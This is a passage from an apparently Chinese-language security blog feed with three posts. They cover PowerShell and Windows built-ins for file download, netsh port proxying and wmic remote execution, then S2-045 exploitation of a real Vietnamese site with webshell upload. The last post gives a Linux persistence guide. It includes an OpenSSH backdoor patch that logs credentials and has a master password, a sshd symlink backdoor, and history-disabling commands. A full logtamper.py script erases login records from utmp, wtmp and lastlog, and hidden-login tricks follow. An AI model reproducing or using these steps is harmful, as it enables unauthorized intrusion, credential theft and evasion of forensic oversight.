<h2 id="在线web客户端-wget"><a href="#在线web客户端-wget" class="headerlink" title="在线web客户端(wget)"></a>在线web客户端(wget)</h2><p><img src="http://i4.buimg.com/567571/e31e273821d03357.png" alt=""><br>在window下缺少文件的传输工具，将文件移动到Windows环境中是一项比较困难的任务，<br>没有netcat，wget，curl，ssh或者python，而在linux下相对来说要简单得多。</p>
<p>但是在PowerShell中，我们上面所有的功能都可以获得，甚至包括wget。，下面来看看。</p>
<h3 id="WebClient"><a href="#WebClient" class="headerlink" title="WebClient"></a>WebClient</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(New-Object System.Net.WebClient).DownloadFile(&quot;http://10.0.0.10/demo.exe&quot;,&quot;demo.exe&quot;)</div></pre></td></tr></table></figure>
<p><img src="http://i1.piimg.com/567571/c94e2495e655708f.png" alt=""><br>上述命令在Powershell的所有版本中都是可用的，所以不知道Powershell版本的情况下，是最佳选择。</p>
<h4 id="命令分解-6"><a href="#命令分解-6" class="headerlink" title="命令分解"></a>命令分解</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">(New-Object System.Net.WebClient)  - 创建WebClient类的实例。WebClient对象具有像GUI Web客户端一样执行所需的所有功能。</div><div class="line">DownloadFile（“ - 在WebClient类中调用DownloadFile方法,此方法允许WebClient从远程服务器下载某些东西</div></pre></td></tr></table></figure>
<h3 id="Invoke-WebRequest"><a href="#Invoke-WebRequest" class="headerlink" title="Invoke-WebRequest"></a>Invoke-WebRequest</h3><p>类似于linux版本下的wget。<br><img src="http://i4.buimg.com/567571/4d46663e1f4a4e71.png" alt=""><br>在帮助信息上，都很详细的有使用方法。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wget &quot;http://10.0.0.10/demo1.exe&quot; -outfile &quot;demo1.exe&quot;</div></pre></td></tr></table></figure></p>
<h3 id="显示PowerShell的版本"><a href="#显示PowerShell的版本" class="headerlink" title="显示PowerShell的版本"></a>显示PowerShell的版本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Get-Host</div><div class="line">或</div><div class="line">$PSVersionTable.PSVersion</div></pre></td></tr></table></figure>
<p><img src="http://i2.muimg.com/567571/0b32e0c25eb12e28.png" alt=""></p>
<h2 id="netsh-interfac"><a href="#netsh-interfac" class="headerlink" title="netsh interfac"></a>netsh interfac</h2><p><img src="http://i2.muimg.com/567571/d8cefb6ef776005e.png" alt=""><br>在linux上进行端口转发是很容易的。但是在window下的话，除了使用上传的工具，就只有使用本身自带的。<br>NetSH (Network Shell) 是windows系统本身提供的功能强大的网络配置命令行工具<br>Netsh接口Portproxy命令.<br>对于在 IPv4 和 IPv6 网络和应用程序之间充当代理的管理服务器 </p>
<h3 id="将配置了-IPv4-的计算机和应用程序消息发送到配置了-IPv6-的计算机和应用程序。"><a href="#将配置了-IPv4-的计算机和应用程序消息发送到配置了-IPv6-的计算机和应用程序。" class="headerlink" title="将配置了 IPv4 的计算机和应用程序消息发送到配置了 IPv6 的计算机和应用程序。"></a>将配置了 IPv4 的计算机和应用程序消息发送到配置了 IPv6 的计算机和应用程序。</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">netsh interface portproxy add v4tov6 listenport=8888 listenaddress=0.0.0.0 connectport=80 connectaddress=2000::1:215:5dff:fe01:247</div></pre></td></tr></table></figure>
<h4 id="命令分解-7"><a href="#命令分解-7" class="headerlink" title="命令分解"></a>命令分解</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">netsh  - 用于操纵网络接口的命令行工具</div><div class="line">interface - 允许用户操作上下文的（TCP/ IPv4/6）</div><div class="line">portproxy  - 在IPv4和IPv6网络和应用程序之间建立代理</div><div class="line">v4tov6  - 将接收的IPv4流量转换为IPv6</div><div class="line">listenaddress -监听地址</div><div class="line">connectport  - 要连接的端</div><div class="line">connectaddress  - 连接地址</div></pre></td></tr></table></figure>
<h3 id="将配置了-IPv4-的计算机和应用程序消息发送到其他配置了-IPv4-的计算机和应用程序。"><a href="#将配置了-IPv4-的计算机和应用程序消息发送到其他配置了-IPv4-的计算机和应用程序。" class="headerlink" title="将配置了 IPv4 的计算机和应用程序消息发送到其他配置了 IPv4 的计算机和应用程序。"></a>将配置了 IPv4 的计算机和应用程序消息发送到其他配置了 IPv4 的计算机和应用程序。</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">netsh interface portproxy add v4tov4 listenport=9999 listenaddress=0.0.0.0 connectport=445 connectaddress=172.16.1.101</div></pre></td></tr></table></figure>
<p>如果想要证明是否正确执行，那就只需要用nmap进行探测即可。</p>
<h3 id="ipconfig"><a href="#ipconfig" class="headerlink" title="ipconfig"></a>ipconfig</h3><p>window下的ipconfig命令提供了网络接口配置的详细信息<br>使用netsh进行实现、<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">netsh interface ipv4 show addresses</div></pre></td></tr></table></figure></p>
<p>demo:<br><img src="http://i4.buimg.com/567571/0ce54df154b95211.png" alt=""><br>netsh还提供了像ipc$一样的远程管理功能，当然两者是不一样的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">netsh -r 192.168.1.103 -u entsim\administrator -p password</div></pre></td></tr></table></figure></p>
<p>如果成功连接，就能得到一个交互式的shell。<br>更多的netsh命令参照<a href="https://wenku.baidu.com/view/a2280c3610661ed9ad51f302.html" target="_blank" rel="external">netsh命令的用法</a><br><a href="http://www.2cto.com/net/201305/211697.html" target="_blank" rel="external">Netsh接口Portproxy命令</a></p>
<h2 id="wmic-process"><a href="#wmic-process" class="headerlink" title="wmic process"></a>wmic process</h2><p>WMIC扩展WMI（Windows Management Instrumentation，Windows管理工具） ，提供了从命令行接口和批命令脚本执行系统管理的支持。<br><img src="http://i1.piimg.com/567571/944b17aea5f0824e.png" alt=""></p>
<h3 id="获取正在运行的进程"><a href="#获取正在运行的进程" class="headerlink" title="获取正在运行的进程"></a>获取正在运行的进程</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wmic process list full</div></pre></td></tr></table></figure>
<p>demo:<br><img src="http://i4.buimg.com/4851/342950776c2c3889.png" alt=""></p>
<h3 id="将结果输出"><a href="#将结果输出" class="headerlink" title="将结果输出"></a>将结果输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wmic /output:wmic.html process list full /format:hform</div></pre></td></tr></table></figure>
<p>demo:<br><img src="http://i4.buimg.com/4851/5455c43b595e55f3.png" alt=""></p>
<h4 id="命令分解-8"><a href="#命令分解-8" class="headerlink" title="命令分解"></a>命令分解</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">/output:wmic.html  - 将WMIC的输出打印到HTML文件</div><div class="line">/format：hform  - 选项包括表，列表，csv，xml，htable和hform。hform以HTML格式打印WMIC输出.</div></pre></td></tr></table></figure>
<h3 id="启动的程序"><a href="#启动的程序" class="headerlink" title="启动的程序"></a>启动的程序</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wmic startup list brief</div></pre></td></tr></table></figure>
<h3 id="远程命令执行"><a href="#远程命令执行" class="headerlink" title="远程命令执行"></a>远程命令执行</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wmic /node:10.0.0.1 /user:Administrator process call create &quot;cmd.exe /c calc.exe&quot;</div></pre></td></tr></table></figure>
<p>在横向pentest中，可以使用wmic来利用网络凭证来执行远程命令。<br>wmic命令类似于psexec。</p>
<p>参考：<br><a href="https://pen-testing.sans.org/blog/" target="_blank" rel="external">Pen Test Poster: “White Board”</a>–（翻译）<br><a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="external">https://github.com/PowerShellMafia/PowerSploit</a><br><a href="https://blogs.sans.org/pen-testing/files/2017/03/Board-Elements_fung-fu.pdf" target="_blank" rel="external">https://blogs.sans.org/pen-testing/files/2017/03/Board-Elements_fung-fu.pdf</a><br><a href="https://www.sans.org/reading-room/whitepapers/access/identifying-vulnerable-network-protocols-powershell-37722" target="_blank" rel="external">https://www.sans.org/reading-room/whitepapers/access/identifying-vulnerable-network-protocols-powershell-37722</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;总结一些PowerShell的简单操作&lt;br&gt;
    
    </summary>
    
      <category term="PowerShell" scheme="http://rcoil.me/categories/PowerShell/"/>
    
    
      <category term="PowerShell" scheme="http://rcoil.me/tags/PowerShell/"/>
    
  </entry>
  
  <entry>
    <title>STR2-045的简单利用</title>
    <link href="http://rcoil.me/2017/04/STR2-045%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/"/>
    <id>http://rcoil.me/2017/04/STR2-045的简单利用/</id>
    <published>2017-04-04T05:19:23.000Z</published>
    <updated>2017-08-01T15:57:08.227Z</updated>
    
    <content type="html"><![CDATA[<p>str2-045已经过去一段时间了，现在修复得也差不多了，就将之前做的一些东西简单记录一下。<br><a id="more"></a><br>原理什么的就不解释了</p>
<h2 id="WebShell"><a href="#WebShell" class="headerlink" title="WebShell"></a>WebShell</h2><p>找了个vn站点进行测试。<br><img src="http://i1.piimg.com/567571/15b2c2a93bc417d7.png" alt=""><br>tomcat这种中间组件大都是root权限运行，但是也有少数限制了权限。</p>
<p>当然，去看了看，已经发现有前辈在前面开路了。</p>
<p>然后就是上传脚本进行巩固权限。<br><img src="http://i2.muimg.com/567571/d57f5875cf41aeea.png" alt=""><br>当然也可以直接转发出来开搞。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">uname -a </div><div class="line">Linux ubuntu 3.19.0-26-generic #28~14.04.1-Ubuntu SMP Wed Aug 12 14:09:17 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux</div></pre></td></tr></table></figure></p>
<p>因为已经不需要提权了，所以看看有什么收获。<br>弄着弄着网络就出问题了。</p>
<h2 id="SSH后门"><a href="#SSH后门" class="headerlink" title="SSH后门"></a>SSH后门</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[/home/sysadmin/]$ ssh -V</div><div class="line"></div><div class="line">OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.8, OpenSSL 1.0.1f 6 Jan 2014</div></pre></td></tr></table></figure>
<p>先记录好原来ssh的版本信息，在后面有用</p>
<p>然后进行常规的ssh后门的安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz</div><div class="line">http://ftp.vim.org/security/OpenSSH/openssh-5.9p1.tar.gz</div><div class="line">tar zxvf openssh-5.9p1.tar.gz   </div><div class="line">tar zxvf 0x06-openssh-5.9p1.patch.tar.gz   </div><div class="line">cd openssh-5.9p1.patch/   </div><div class="line">cp sshbd5.9p1.diff ../openssh-5.9p1   </div><div class="line">cd ../openssh-5.9p1   </div><div class="line">patch &lt; sshbd5.9p1.diff   //patch  后门</div><div class="line">执行vi includes.h</div><div class="line"></div><div class="line">+#define ILOG &quot;/tmp/ilog&quot; //记录登录到本机的用户名和密码</div><div class="line">+#define OLOG &quot;/tmp/olog&quot; //记录本机登录到远程的用户名和密码</div><div class="line">+#define SECRETPW &quot;123456654321&quot; //你后门的密码</div><div class="line"></div><div class="line">执行vi version.h</div><div class="line"></div><div class="line">#define SSH_VERSION &quot;填入之前记下来的版本号,伪装原版本&quot;</div><div class="line">#define SSH_PORTABLE &quot;小版本号&quot;</div><div class="line">./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5</div></pre></td></tr></table></figure></p>
<p>到了这里出现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">注意要是出现:configure: error: *** zlib.h missing – please install first or check config.log</div></pre></td></tr></table></figure></p>
<p>这是没有提前装好环境的原因<br>使用命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install zlib1g</div><div class="line">sudo apt-get install zlib1g.dev</div></pre></td></tr></table></figure></p>
<p>如果提示<code>E: 无法获得锁 /var/lib/apt/lists/lock - open</code></p>
<p>那就是因为<code>apt-get</code>程序被占用了。使用<code>sudo killall apt-get</code>，杀掉进程再进行安装。<br>如果提示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">configure: error: *** OpenSSL headers missing - please install first or check config.log ***</div></pre></td></tr></table></figure></p>
<p>那就执行<code>apt-get install libssl-dev</code></p>
<p>如果提示<code>configure: error: PAM headers not found</code><br>那就执行<code>apt-get install libpam0g-dev</code></p>
<p>但是在装依赖的时候出现问题，无法解决。</p>
<p>没装有PAM。<br>当然也可以快速获取一个ssh后门，但是缺点也很明显。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=8888</div></pre></td></tr></table></figure></p>
<p>然后就没继续了。。。。。（尴尬）</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;str2-045已经过去一段时间了，现在修复得也差不多了，就将之前做的一些东西简单记录一下。&lt;br&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://rcoil.me/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Web安全" scheme="http://rcoil.me/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Linux后门</title>
    <link href="http://rcoil.me/2017/04/Linux%E5%B0%8F%E5%90%8E%E9%97%A8/"/>
    <id>http://rcoil.me/2017/04/Linux小后门/</id>
    <published>2017-04-03T05:19:23.000Z</published>
    <updated>2017-09-10T13:39:57.709Z</updated>
    
    <content type="html"><![CDATA[<p>记录之前所写的东西，这篇找不到原来的发布时间了。<br><a id="more"></a><br><img src="/image/Linux后门种类.png" alt="Linux后门种类"></p>
<h2 id="PAM后门"><a href="#PAM后门" class="headerlink" title="PAM后门"></a>PAM后门</h2><p>需要编译环境</p>
<h3 id="概述："><a href="#概述：" class="headerlink" title="概述："></a>概述：</h3><p>PAM （Pluggable AuthenticationModules ）是由Sun提出的一种认证机制。它通过提供一些动态链接库和一套统一的API，将系统提供的服务和该服务的认证方式分开，使得系统管理员可以灵活地根据需要给不同的服务配置不同的认证方式而无需更改服务程序，同时也便于向系统中添加新的认证手段。PAM最初是集成在Solaris中，目前已移植到其它系统中，如Linux、SunOS、HP-UX9.0等。</p>
<h2 id="openssh后门"><a href="#openssh后门" class="headerlink" title="openssh后门"></a>openssh后门</h2><p>进入主机后，先执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">unset HISTFILE;export HISTFILESIZE=0;export HISTIGNORE=*;export HISTCONTROL=ignorespace</div></pre></td></tr></table></figure></p>
<h3 id="SSH留后门"><a href="#SSH留后门" class="headerlink" title="SSH留后门"></a>SSH留后门</h3><p>简单来说就是以下的代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">yum install -y openssl openssl-devel pam-devel</div><div class="line">http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz</div><div class="line">http://ftp.vim.org/security/OpenSSH/openssh-5.9p1.tar.gz</div><div class="line">tar zxvf openssh-5.9p1.tar.gz   </div><div class="line">tar zxvf 0x06-openssh-5.9p1.patch.tar.gz   </div><div class="line">cd openssh-5.9p1.patch/   </div><div class="line">cp sshbd5.9p1.diff ../openssh-5.9p1   </div><div class="line">cd ../openssh-5.9p1   </div><div class="line">patch &lt; sshbd5.9p1.diff   //patch  后门</div><div class="line">执行vi includes.h</div><div class="line"></div><div class="line">+#define ILOG &quot;/tmp/ilog&quot; //记录登录到本机的用户名和密码</div><div class="line">+#define OLOG &quot;/tmp/olog&quot; //记录本机登录到远程的用户名和密码</div><div class="line">+#define SECRETPW &quot;123456654321&quot; //你后门的密码</div><div class="line"></div><div class="line">执行vi version.h</div><div class="line"></div><div class="line">#define SSH_VERSION &quot;填入之前记下来的版本号,伪装原版本&quot;</div><div class="line">#define SSH_PORTABLE &quot;小版本号&quot;</div><div class="line">./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5</div><div class="line">make &amp;&amp; make install </div><div class="line">service sshd restart //重启sshd</div></pre></td></tr></table></figure></p>
<p>注意不同的ubuntu系统对应的安装命令会不一样，而且安装包名也会不一样。</p>
<h3 id="清除痕迹"><a href="#清除痕迹" class="headerlink" title="清除痕迹"></a>清除痕迹</h3><p>接下来删除登录的历史记录，使用logtamper.py代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"><span class="comment"># mail: cn.b4dboy@gmail.com</span></div><div class="line">  </div><div class="line"><span class="keyword">import</span> os, struct, sys</div><div class="line"><span class="keyword">from</span> pwd <span class="keyword">import</span> getpwnam</div><div class="line"><span class="keyword">from</span> time <span class="keyword">import</span> strptime, mktime</div><div class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</div><div class="line">  </div><div class="line">UTMPFILE = <span class="string">"/var/run/utmp"</span></div><div class="line">WTMPFILE = <span class="string">"/var/log/wtmp"</span></div><div class="line">LASTLOGFILE = <span class="string">"/var/log/lastlog"</span></div><div class="line">  </div><div class="line">LAST_STRUCT = <span class="string">'I32s256s'</span></div><div class="line">LAST_STRUCT_SIZE = struct.calcsize(LAST_STRUCT)</div><div class="line">  </div><div class="line">XTMP_STRUCT = <span class="string">'hi32s4s32s256shhiii4i20x'</span></div><div class="line">XTMP_STRUCT_SIZE = struct.calcsize(XTMP_STRUCT)</div><div class="line">  </div><div class="line">  </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getXtmp</span><span class="params">(filename, username, hostname)</span>:</span></div><div class="line">    xtmp = <span class="string">''</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        fp = open(filename, <span class="string">'rb'</span>)</div><div class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">            bytes = fp.read(XTMP_STRUCT_SIZE)</div><div class="line">            <span class="keyword">if</span> <span class="keyword">not</span> bytes:</div><div class="line">                <span class="keyword">break</span></div><div class="line">  </div><div class="line">            data = struct.unpack(XTMP_STRUCT, bytes)</div><div class="line">            record = [(<span class="keyword">lambda</span> s: str(s).split(<span class="string">"\0"</span>, <span class="number">1</span>)[<span class="number">0</span>])(i) <span class="keyword">for</span> i <span class="keyword">in</span> data]</div><div class="line">            <span class="keyword">if</span> (record[<span class="number">4</span>] == username <span class="keyword">and</span> record[<span class="number">5</span>] == hostname):</div><div class="line">                <span class="keyword">continue</span></div><div class="line">            xtmp += bytes</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        showMessage(<span class="string">'Cannot open file: %s'</span> % filename)</div><div class="line">    <span class="keyword">finally</span>:</div><div class="line">        fp.close()</div><div class="line">    <span class="keyword">return</span> xtmp</div><div class="line">  </div><div class="line">  </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">modifyLast</span><span class="params">(filename, username, hostname, ttyname, strtime)</span>:</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        p = getpwnam(username)</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        showMessage(<span class="string">'No such user.'</span>)</div><div class="line">  </div><div class="line">    timestamp = <span class="number">0</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        str2time = strptime(strtime, <span class="string">'%Y:%m:%d:%H:%M:%S'</span>)</div><div class="line">        timestamp = int(mktime(str2time))</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        showMessage(<span class="string">'Time format err.'</span>)</div><div class="line">  </div><div class="line">    data = struct.pack(LAST_STRUCT, timestamp, ttyname, hostname)</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        fp = open(filename, <span class="string">'wb'</span>)</div><div class="line">        fp.seek(LAST_STRUCT_SIZE * p.pw_uid)</div><div class="line">        fp.write(data)</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        showMessage(<span class="string">'Cannot open file: %s'</span> % filename)</div><div class="line">    <span class="keyword">finally</span>:</div><div class="line">        fp.close()</div><div class="line">    <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">  </div><div class="line">  </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">showMessage</span><span class="params">(msg)</span>:</span></div><div class="line">    <span class="keyword">print</span> msg</div><div class="line">    exit(<span class="number">-1</span>)</div><div class="line">  </div><div class="line">  </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">saveFile</span><span class="params">(filename, contents)</span>:</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        fp = open(filename, <span class="string">'w+b'</span>)</div><div class="line">        fp.write(contents)</div><div class="line">    <span class="keyword">except</span> IOError <span class="keyword">as</span> e:</div><div class="line">        showMessage(e)</div><div class="line">    <span class="keyword">finally</span>:</div><div class="line">        fp.close()</div><div class="line">  </div><div class="line">  </div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    usage = <span class="string">'usage: logtamper.py -m 2 -u b4dboy -i 192.168.0.188\n \</span></div><div class="line"><span class="string">        logtamper.py -m 3 -u b4dboy -i 192.168.0.188 -t tty1 -d 2015:05:28:10:11:12'</span></div><div class="line">    parser = OptionParser(usage=usage)</div><div class="line">    parser.add_option(<span class="string">'-m'</span>, <span class="string">'--mode'</span>, dest=<span class="string">'MODE'</span>, default=<span class="string">'1'</span> , help=<span class="string">'1: utmp, 2: wtmp, 3: lastlog [default: 1]'</span>)</div><div class="line">    parser.add_option(<span class="string">'-t'</span>, <span class="string">'--ttyname'</span>, dest=<span class="string">'TTYNAME'</span>)</div><div class="line">    parser.add_option(<span class="string">'-f'</span>, <span class="string">'--filename'</span>, dest=<span class="string">'FILENAME'</span>)</div><div class="line">    parser.add_option(<span class="string">'-u'</span>, <span class="string">'--username'</span>, dest=<span class="string">'USERNAME'</span>)</div><div class="line">    parser.add_option(<span class="string">'-i'</span>, <span class="string">'--hostname'</span>, dest=<span class="string">'HOSTNAME'</span>)</div><div class="line">    parser.add_option(<span class="string">'-d'</span>, <span class="string">'--dateline'</span>, dest=<span class="string">'DATELINE'</span>)</div><div class="line">    (options, args) = parser.parse_args()</div><div class="line">  </div><div class="line">    <span class="keyword">if</span> len(args) &lt; <span class="number">3</span>:</div><div class="line">        <span class="keyword">if</span> options.MODE == <span class="string">'1'</span>:</div><div class="line">            <span class="keyword">if</span> options.USERNAME == <span class="keyword">None</span> <span class="keyword">or</span> options.HOSTNAME == <span class="keyword">None</span>:</div><div class="line">                showMessage(<span class="string">'+[Warning]: Incorrect parameter.\n'</span>)</div><div class="line">  </div><div class="line">            <span class="keyword">if</span> options.FILENAME == <span class="keyword">None</span>:</div><div class="line">                options.FILENAME = UTMPFILE</div><div class="line">  </div><div class="line">            <span class="comment"># tamper</span></div><div class="line">            newData = getXtmp(options.FILENAME, options.USERNAME, options.HOSTNAME)</div><div class="line">            saveFile(options.FILENAME, newData)</div><div class="line">  </div><div class="line">        <span class="keyword">elif</span> options.MODE == <span class="string">'2'</span>:</div><div class="line">            <span class="keyword">if</span> options.USERNAME == <span class="keyword">None</span> <span class="keyword">or</span> options.HOSTNAME == <span class="keyword">None</span>:</div><div class="line">                showMessage(<span class="string">'+[Warning]: Incorrect parameter.\n'</span>)</div><div class="line">  </div><div class="line">            <span class="keyword">if</span> options.FILENAME == <span class="keyword">None</span>:</div><div class="line">                options.FILENAME = WTMPFILE</div><div class="line">  </div><div class="line">            <span class="comment"># tamper</span></div><div class="line">            newData = getXtmp(options.FILENAME, options.USERNAME, options.HOSTNAME)</div><div class="line">            saveFile(options.FILENAME, newData)</div><div class="line">  </div><div class="line">        <span class="keyword">elif</span> options.MODE == <span class="string">'3'</span>:</div><div class="line">            <span class="keyword">if</span> options.USERNAME == <span class="keyword">None</span> <span class="keyword">or</span> options.HOSTNAME == <span class="keyword">None</span> <span class="keyword">or</span> options.TTYNAME == <span class="keyword">None</span> <span class="keyword">or</span> options.DATELINE == <span class="keyword">None</span>:</div><div class="line">                showMessage(<span class="string">'+[Warning]: Incorrect parameter.\n'</span>)</div><div class="line">  </div><div class="line">            <span class="keyword">if</span> options.FILENAME == <span class="keyword">None</span>:</div><div class="line">                options.FILENAME = LASTLOGFILE</div><div class="line">  </div><div class="line">            <span class="comment"># tamper</span></div><div class="line">            modifyLast(options.FILENAME, options.USERNAME, options.HOSTNAME, options.TTYNAME , options.DATELINE)</div><div class="line">  </div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            parser.print_help()</div></pre></td></tr></table></figure></p>
<h3 id="隐身登陆"><a href="#隐身登陆" class="headerlink" title="隐身登陆"></a>隐身登陆</h3><p>隐藏的远程登录(w 看不到)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ssh -T user @ host </div><div class="line">/bin/bash -i</div></pre></td></tr></table></figure></p>
<p>或</p>
<p>隐藏的远程登录(w 看不到)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ssh -o UserKnownHostsFile=/dev/null -T user@host </div><div class="line">/bin/bash -if</div></pre></td></tr></table></figure></p>
